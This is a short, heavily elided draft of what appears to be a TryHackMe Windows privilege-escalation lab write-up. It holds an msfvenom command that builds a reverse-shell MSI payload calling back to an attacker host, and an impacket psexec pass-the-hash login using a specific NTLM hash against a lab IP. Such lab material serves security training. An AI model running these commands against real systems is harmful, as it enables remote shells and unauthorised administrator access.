...
published: false
---
![Windows Privilege Escalation](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3de813de08870491b232d4fe5b4542f5.png)
...
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.165.55 LPORT=LOCAL_PORT -f msi -o malicious.msi
```
...
```
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.53.52
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
...
![Druva](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)
